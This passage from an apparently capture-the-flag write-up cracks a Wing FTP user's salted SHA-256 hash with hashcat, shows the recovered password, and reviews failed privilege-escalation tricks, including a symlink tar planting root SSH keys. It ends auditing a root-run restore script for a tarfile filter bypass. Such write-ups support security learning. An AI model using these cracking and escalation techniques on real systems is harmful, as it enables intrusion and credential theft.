+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="ex">c_GetAdminOptionInt</span><span class="er">(</span><span class="ex">ADMIN_OPTION_ENABLE_SHA256</span><span class="kw">)</span> <span class="ex">==</span> 1 then</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">password_md5</span> = sha2<span class="er">(</span><span class="ex">temppass</span><span class="kw">)</span></span></code></pre></div>
+<p>and for users:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="ex">c_GetOptionInt</span><span class="er">(</span><span class="ex">domain,</span> DOPTION_ENABLE_PASS_SALTING<span class="kw">)</span> <span class="ex">==</span> 1 then</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">temppass</span> = user.password..salt_string</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="ex">c_GetOptionInt</span><span class="er">(</span><span class="ex">domain,</span> DOPTION_ENABLE_SHA256<span class="kw">)</span> <span class="ex">==</span> 1 then</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">password_md5</span> = sha2<span class="er">(</span><span class="ex">temppass</span><span class="kw">)</span></span></code></pre></div>
+<p>so admin is definitely <code>sha256(password + "WingFTP"</code>, and users is <code>sha256(password + salt_string</code>, which is a dynamic salt so we need to find <code>salt_string</code>. basically back to square 1</p>
+<p>searched for about an hour and a half for the salt, which is embarrassing actually because after pestering claude for 10 minutes i realized it's actually a default salt with wingftp... the default salt is literally <code>"WingFTP"</code></p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="bu">.</span><span class="dt">\h</span>ashcat.exe <span class="at">-m</span> 1410 <span class="at">-O</span> <span class="st">&quot;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP&quot;</span> ..<span class="dt">\r</span>ockyou.txt<span class="dt">\r</span>ockyou.txt</span></code></pre></div>
+<div class="sourceCode" id="cb12"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Approaching</span> final keyspace <span class="at">-</span> workload adjusted.</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="ex">32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Session..........:</span> hashcat</span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Status...........:</span> Cracked</span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Hash.Mode........:</span> 1410 <span class="er">(</span><span class="ex">sha256</span><span class="er">(</span><span class="va">$pass</span><span class="ex">.</span><span class="va">$salt</span><span class="kw">))</span></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Hash.Target......:</span> 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b87...ingFTP</span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Time.Started.....:</span> Sat Mar 21 15:11:22 2026 <span class="er">(</span><span class="ex">0</span> secs<span class="kw">)</span></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="ex">Time.Estimated...:</span> Sat Mar 21 15:11:22 2026 <span class="er">(</span><span class="ex">0</span> secs<span class="kw">)</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="ex">Kernel.Feature...:</span> Optimized Kernel <span class="er">(</span><span class="ex">password</span> length 0-31 chars<span class="kw">)</span></span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a><span class="ex">Guess.Base.......:</span> File <span class="er">(</span><span class="ex">..\rockyou.txt\rockyou.txt</span><span class="kw">)</span></span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Guess.Queue......:</span> 1/1 <span class="er">(</span><span class="ex">100.00%</span><span class="kw">)</span></span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a><span class="ex">Speed.#01........:</span> 39670.7 kH/s <span class="er">(</span><span class="ex">0.36ms</span><span class="kw">)</span> <span class="ex">@</span> Accel:224 Loops:1 Thr:256 Vec:1</span>
+<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Speed.#02........:</span>  5263.3 kH/s <span class="er">(</span><span class="ex">1.00ms</span><span class="kw">)</span> <span class="ex">@</span> Accel:1024 Loops:1 Thr:256 Vec:1</span>
+<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a><span class="ex">Speed.#*.........:</span> 44933.9 kH/s</span>
+<span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Recovered........:</span> 1/1 <span class="er">(</span><span class="ex">100.00%</span><span class="kw">)</span> <span class="ex">Digests</span> <span class="er">(</span><span class="ex">total</span><span class="kw">)</span><span class="ex">,</span> 1/1 <span class="er">(</span><span class="ex">100.00%</span><span class="kw">)</span> <span class="ex">Digests</span> <span class="er">(</span><span class="ex">new</span><span class="kw">)</span></span>
+<span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a><span class="ex">Progress.........:</span> 14344384/14344384 <span class="er">(</span><span class="ex">100.00%</span><span class="kw">)</span></span>
+<span id="cb12-19"><a href="#cb12-19" aria-hidden="true" tabindex="-1"></a><span class="ex">Rejected.........:</span> 3094/14344384 <span class="er">(</span><span class="ex">0.02%</span><span class="kw">)</span></span>
+<span id="cb12-20"><a href="#cb12-20" aria-hidden="true" tabindex="-1"></a><span class="ex">Restore.Point....:</span> 13700040/14344384 <span class="er">(</span><span class="ex">95.51%</span><span class="kw">)</span></span>
+<span id="cb12-21"><a href="#cb12-21" aria-hidden="true" tabindex="-1"></a><span class="ex">Restore.Sub.#01..:</span> Salt:0 Amplifier:0-1 Iteration:0-1</span>
+<span id="cb12-22"><a href="#cb12-22" aria-hidden="true" tabindex="-1"></a><span class="ex">Restore.Sub.#02..:</span> Salt:0 Amplifier:0-1 Iteration:0-1</span>
+<span id="cb12-23"><a href="#cb12-23" aria-hidden="true" tabindex="-1"></a><span class="ex">Candidate.Engine.:</span> Device Generator</span>
+<span id="cb12-24"><a href="#cb12-24" aria-hidden="true" tabindex="-1"></a><span class="ex">Candidates.#01...:</span> 0831815070 <span class="at">-</span><span class="op">&gt;</span> <span class="va">$HEX</span><span class="pp">[</span><span class="ss">042a0337c2a156616d6f732103</span><span class="pp">]</span></span>
+<span id="cb12-25"><a href="#cb12-25" aria-hidden="true" tabindex="-1"></a><span class="ex">Candidates.#02...:</span> 0834207037 <span class="at">-</span><span class="op">&gt;</span> 0831815085</span>
+<span id="cb12-26"><a href="#cb12-26" aria-hidden="true" tabindex="-1"></a><span class="ex">Hardware.Mon.#01.:</span> Temp: 52c Fan:  0% Util: 12% Core:2587MHz Mem:13801MHz Bus:4</span>
+<span id="cb12-27"><a href="#cb12-27" aria-hidden="true" tabindex="-1"></a><span class="ex">Hardware.Mon.#02.:</span> Temp:  0c Fan:  0% Util:  0% Core: 600MHz Mem:2400MHz Bus:16</span>
+<span id="cb12-28"><a href="#cb12-28" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-29"><a href="#cb12-29" aria-hidden="true" tabindex="-1"></a><span class="ex">Started:</span> Sat Mar 21 15:11:20 2026</span>
+<span id="cb12-30"><a href="#cb12-30" aria-hidden="true" tabindex="-1"></a><span class="ex">Stopped:</span> Sat Mar 21 15:11:23 2026</span></code></pre></div>
+<p>user: wacky<br />
+password: <code>!#7Blushing^*Bride5</code></p>
+<h1 id="privesc-methodology--fails">privesc methodology &amp; fails</h1>
+<div class="sourceCode" id="cb13"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">wacky@wingdata:~$</span> sudo <span class="at">-l</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Matching</span> Defaults entries for wacky on wingdata:</span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">env_reset,</span> mail_badpass,</span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>    <span class="va">secure_path</span><span class="op">=</span>/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, <span class="ex">use_pty</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="ex">User</span> wacky may run the following commands on wingdata:</span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="ex">NOPASSWD:</span> /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py <span class="pp">*</span></span></code></pre></div>
+<p>checked what's actually in that script:</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python3</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> tarfile</span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> re</span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> argparse</span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a>BACKUP_BASE_DIR <span class="op">=</span> <span class="st">&quot;/opt/backup_clients/backups&quot;</span></span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a>STAGING_BASE <span class="op">=</span> <span class="st">&quot;/opt/backup_clients/restored_backups&quot;</span></span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> validate_backup_name(filename):</span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">not</span> re.fullmatch(<span class="vs">r&quot;</span><span class="dv">^</span><span class="vs">backup_</span><span class="dv">\d</span><span class="op">+</span><span class="ch">\.</span><span class="vs">tar</span><span class="dv">$</span><span class="vs">&quot;</span>, filename):</span>
+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="va">False</span></span>
+<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a>    client_id <span class="op">=</span> filename.split(<span class="st">&#39;_&#39;</span>)[<span class="dv">1</span>].rstrip(<span class="st">&#39;.tar&#39;</span>)</span>
+<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> client_id.isdigit() <span class="kw">and</span> client_id <span class="op">!=</span> <span class="st">&quot;0&quot;</span></span>
+<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> validate_restore_tag(tag):</span>
+<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="bu">bool</span>(re.fullmatch(<span class="vs">r&quot;</span><span class="dv">^</span><span class="pp">[a-zA-Z0-9_]</span><span class="op">{1,24}</span><span class="dv">$</span><span class="vs">&quot;</span>, tag))</span>
+<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> main():</span>
+<span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a>    parser <span class="op">=</span> argparse.ArgumentParser(</span>
+<span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a>        description<span class="op">=</span><span class="st">&quot;Restore client configuration from a validated backup tarball.&quot;</span>,</span>
+<span id="cb14-23"><a href="#cb14-23" aria-hidden="true" tabindex="-1"></a>        epilog<span class="op">=</span><span class="st">&quot;Example: sudo </span><span class="sc">%(prog)s</span><span class="st"> -b backup_1001.tar -r restore_john&quot;</span></span>
+<span id="cb14-24"><a href="#cb14-24" aria-hidden="true" tabindex="-1"></a>    )</span>
+<span id="cb14-25"><a href="#cb14-25" aria-hidden="true" tabindex="-1"></a>    parser.add_argument(</span>
+<span id="cb14-26"><a href="#cb14-26" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;-b&quot;</span>, <span class="st">&quot;--backup&quot;</span>,</span>
+<span id="cb14-27"><a href="#cb14-27" aria-hidden="true" tabindex="-1"></a>        required<span class="op">=</span><span class="va">True</span>,</span>
+<span id="cb14-28"><a href="#cb14-28" aria-hidden="true" tabindex="-1"></a>        <span class="bu">help</span><span class="op">=</span><span class="st">&quot;Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, &quot;</span></span>
+<span id="cb14-29"><a href="#cb14-29" aria-hidden="true" tabindex="-1"></a>             <span class="st">&quot;where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)&quot;</span></span>
+<span id="cb14-30"><a href="#cb14-30" aria-hidden="true" tabindex="-1"></a>    )</span>
+<span id="cb14-31"><a href="#cb14-31" aria-hidden="true" tabindex="-1"></a>    parser.add_argument(</span>
+<span id="cb14-32"><a href="#cb14-32" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;-r&quot;</span>, <span class="st">&quot;--restore-dir&quot;</span>,</span>
+<span id="cb14-33"><a href="#cb14-33" aria-hidden="true" tabindex="-1"></a>        required<span class="op">=</span><span class="va">True</span>,</span>
+<span id="cb14-34"><a href="#cb14-34" aria-hidden="true" tabindex="-1"></a>        <span class="bu">help</span><span class="op">=</span><span class="st">&quot;Staging directory name for the restore operation. &quot;</span></span>
+<span id="cb14-35"><a href="#cb14-35" aria-hidden="true" tabindex="-1"></a>             <span class="st">&quot;Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). &quot;</span></span>
+<span id="cb14-36"><a href="#cb14-36" aria-hidden="true" tabindex="-1"></a>             <span class="st">&quot;Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).&quot;</span></span>
+<span id="cb14-37"><a href="#cb14-37" aria-hidden="true" tabindex="-1"></a>    )</span>
+<span id="cb14-38"><a href="#cb14-38" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-39"><a href="#cb14-39" aria-hidden="true" tabindex="-1"></a>    args <span class="op">=</span> parser.parse_args()</span>
+<span id="cb14-40"><a href="#cb14-40" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-41"><a href="#cb14-41" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">not</span> validate_backup_name(args.backup):</span>
+<span id="cb14-42"><a href="#cb14-42" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">&quot;[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)&quot;</span>, <span class="bu">file</span><span class="op">=</span>sys.stderr)</span>
+<span id="cb14-43"><a href="#cb14-43" aria-hidden="true" tabindex="-1"></a>        sys.exit(<span class="dv">1</span>)</span>
+<span id="cb14-44"><a href="#cb14-44" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-45"><a href="#cb14-45" aria-hidden="true" tabindex="-1"></a>    backup_path <span class="op">=</span> os.path.join(BACKUP_BASE_DIR, args.backup)</span>
+<span id="cb14-46"><a href="#cb14-46" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">not</span> os.path.isfile(backup_path):</span>
+<span id="cb14-47"><a href="#cb14-47" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f&quot;[!] Backup file not found: </span><span class="sc">{</span>backup_path<span class="sc">}</span><span class="ss">&quot;</span>, <span class="bu">file</span><span class="op">=</span>sys.stderr)</span>
+<span id="cb14-48"><a href="#cb14-48" aria-hidden="true" tabindex="-1"></a>        sys.exit(<span class="dv">1</span>)</span>
+<span id="cb14-49"><a href="#cb14-49" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-50"><a href="#cb14-50" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">not</span> args.restore_dir.startswith(<span class="st">&quot;restore_&quot;</span>):</span>
+<span id="cb14-51"><a href="#cb14-51" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">&quot;[!] --restore-dir must start with &#39;restore_&#39;&quot;</span>, <span class="bu">file</span><span class="op">=</span>sys.stderr)</span>
+<span id="cb14-52"><a href="#cb14-52" aria-hidden="true" tabindex="-1"></a>        sys.exit(<span class="dv">1</span>)</span>
+<span id="cb14-53"><a href="#cb14-53" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-54"><a href="#cb14-54" aria-hidden="true" tabindex="-1"></a>    tag <span class="op">=</span> args.restore_dir[<span class="dv">8</span>:]</span>
+<span id="cb14-55"><a href="#cb14-55" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">not</span> tag:</span>
+<span id="cb14-56"><a href="#cb14-56" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">&quot;[!] --restore-dir must include a non-empty tag after &#39;restore_&#39;&quot;</span>, <span class="bu">file</span><span class="op">=</span>sys.stderr)</span>
+<span id="cb14-57"><a href="#cb14-57" aria-hidden="true" tabindex="-1"></a>        sys.exit(<span class="dv">1</span>)</span>
+<span id="cb14-58"><a href="#cb14-58" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-59"><a href="#cb14-59" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">not</span> validate_restore_tag(tag):</span>
+<span id="cb14-60"><a href="#cb14-60" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">&quot;[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores&quot;</span>, <span class="bu">file</span><span class="op">=</span>sys.stderr)</span>
+<span id="cb14-61"><a href="#cb14-61" aria-hidden="true" tabindex="-1"></a>        sys.exit(<span class="dv">1</span>)</span>
+<span id="cb14-62"><a href="#cb14-62" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-63"><a href="#cb14-63" aria-hidden="true" tabindex="-1"></a>    staging_dir <span class="op">=</span> os.path.join(STAGING_BASE, args.restore_dir)</span>
+<span id="cb14-64"><a href="#cb14-64" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="ss">f&quot;[+] Backup: </span><span class="sc">{</span>args<span class="sc">.</span>backup<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb14-65"><a href="#cb14-65" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="ss">f&quot;[+] Staging directory: </span><span class="sc">{</span>staging_dir<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb14-66"><a href="#cb14-66" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-67"><a href="#cb14-67" aria-hidden="true" tabindex="-1"></a>    os.makedirs(staging_dir, exist_ok<span class="op">=</span><span class="va">True</span>)</span>
+<span id="cb14-68"><a href="#cb14-68" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-69"><a href="#cb14-69" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span>:</span>
+<span id="cb14-70"><a href="#cb14-70" aria-hidden="true" tabindex="-1"></a>        <span class="cf">with</span> tarfile.<span class="bu">open</span>(backup_path, <span class="st">&quot;r&quot;</span>) <span class="im">as</span> tar:</span>
+<span id="cb14-71"><a href="#cb14-71" aria-hidden="true" tabindex="-1"></a>            tar.extractall(path<span class="op">=</span>staging_dir, <span class="bu">filter</span><span class="op">=</span><span class="st">&quot;data&quot;</span>)</span>
+<span id="cb14-72"><a href="#cb14-72" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f&quot;[+] Extraction completed in </span><span class="sc">{</span>staging_dir<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb14-73"><a href="#cb14-73" aria-hidden="true" tabindex="-1"></a>    <span class="cf">except</span> (tarfile.TarError, <span class="pp">OSError</span>, <span class="pp">Exception</span>) <span class="im">as</span> e:</span>
+<span id="cb14-74"><a href="#cb14-74" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f&quot;[!] Error during extraction: </span><span class="sc">{</span>e<span class="sc">}</span><span class="ss">&quot;</span>, <span class="bu">file</span><span class="op">=</span>sys.stderr)</span>
+<span id="cb14-75"><a href="#cb14-75" aria-hidden="true" tabindex="-1"></a>        sys.exit(<span class="dv">2</span>)</span>
+<span id="cb14-76"><a href="#cb14-76" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-77"><a href="#cb14-77" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
+<span id="cb14-78"><a href="#cb14-78" aria-hidden="true" tabindex="-1"></a>    main()</span></code></pre></div>
+<p>for a bit i tried import hijacking, i figured since sudo allowed running Python3 with a specific script, i could try to drop a malicious <code>tarfile.py</code> file in <code>/tmp</code>, basically hoping python would import mine instead of stdlib. but this of course failed because Python 3.12 doesn't include <code>.</code> in <code>sys.path</code> by default (rip)</p>
+<p>then, i tried a symlink tar attack (manually), basically crafting a tar with a symlink pointing to <code>/root/.ssh</code> and writing <code>authorized_keys</code> through it. this would have worked on older Python but it got blocked</p>
+<p>next, i tried a script overwrite, basically checking if i could just overwrite <code>restore_backup_clients.py</code> with malicious code, but we didn't have write perms, only read+execute, so this failed</p>
+<p>finally, i tried an absolute path tar entry, i tried a tar with <code>/etc/passwd</code> as the entry name, but also got blocked</p>
+<h1 id="cve-2025-4138-why-manual-code-auditing-wins">CVE-2025-4138; why manual code auditing wins</h1>
+<p>naturally, i started to wonder why every single attempt i had was getting blocked. rather than pestering claude, i started closely reading &amp; analyzing the code, step-by-step, piece-by-piece. i'll break it down, and at the end i'll explain what led me to finding the CVE</p>
+<p>constants:</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>BACKUP_BASE_DIR <span class="op">=</span> <span class="st">&quot;/opt/backup_clients/backups&quot;</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>STAGING_BASE <span class="op">=</span> <span class="st">&quot;/opt/backup_clients/restored_backups&quot;</span></span></code></pre></div>
+<p><code>validate_backup_name(filename)</code>:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">not</span> re.fullmatch(<span class="vs">r&quot;</span><span class="dv">^</span><span class="vs">backup_</span><span class="dv">\d</span><span class="op">+</span><span class="ch">\.</span><span class="vs">tar</span><span class="dv">$</span><span class="vs">&quot;</span>, filename):</span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="va">False</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>client_id <span class="op">=</span> filename.split(<span class="st">&#39;_&#39;</span>)[<span class="dv">1</span>].rstrip(<span class="st">&#39;.tar&#39;</span>)</span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span> client_id.isdigit() <span class="kw">and</span> client_id <span class="op">!=</span> <span class="st">&quot;0&quot;</span></span></code></pre></div>
+<p>enforces that the filename matches exactly <code>backup_&lt;number&gt;.tar</code> and that the number isn't zero. essentially prevents me from passing in something like <code>../../../../../etc/passwd</code> or an arbitrary filename as the backup arg</p>
+<p><code>validate_restore_tag(tag)</code>:</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span> <span class="bu">bool</span>(re.fullmatch(<span class="vs">r&quot;</span><span class="dv">^</span><span class="pp">[a-zA-Z0-9_]</span><span class="op">{1,24}</span><span class="dv">$</span><span class="vs">&quot;</span>, tag))</span></code></pre></div>
+<p>only allows alphanumeric+underscores, 1-24 chars. prevents path traversal in the restore directory name, so i can't pass something like <code>restore_../../etc/</code> for example</p>
+<p><code>main()</code>- argument passing:</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>parser.add_argument(<span class="st">&quot;-b&quot;</span>, <span class="st">&quot;--backup&quot;</span>, ...)</span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>parser.add_argument(<span class="st">&quot;-r&quot;</span>, <span class="st">&quot;--restore-dir&quot;</span>, ...)</span></code></pre></div>
+<p>two required args, tar filename &amp; restore directory tag. nothing special</p>
+<p><code>main()</code> - validation chain:</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. filename format check</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">not</span> validate_backup_name(args.backup): sys.exit(<span class="dv">1</span>)</span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. file must actually exist in the hardcoded backups dir</span></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>backup_path <span class="op">=</span> os.path.join(BACKUP_BASE_DIR, args.backup)</span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">not</span> os.path.isfile(backup_path): sys.exit(<span class="dv">1</span>)</span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. restore dir must start with &quot;restore_&quot;</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">not</span> args.restore_dir.startswith(<span class="st">&quot;restore_&quot;</span>): sys.exit(<span class="dv">1</span>)</span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. tag after &quot;restore_&quot; must pass the regex</span></span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a>tag <span class="op">=</span> args.restore_dir[<span class="dv">8</span>:]</span>
+<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">not</span> validate_restore_tag(tag): sys.exit(<span class="dv">1</span>)</span></code></pre></div>
+<p>basically just 4 layers of input validation</p>
+<p><code>main()</code> - vulnerable part:</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>staging_dir <span class="op">=</span> os.path.join(STAGING_BASE, args.restore_dir)</span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>os.makedirs(staging_dir, exist_ok<span class="op">=</span><span class="va">True</span>)</span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="cf">with</span> tarfile.<span class="bu">open</span>(backup_path, <span class="st">&quot;r&quot;</span>) <span class="im">as</span> tar:</span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a>    tar.extractall(path<span class="op">=</span>staging_dir, <span class="bu">filter</span><span class="op">=</span><span class="st">&quot;data&quot;</span>)</span></code></pre></div>
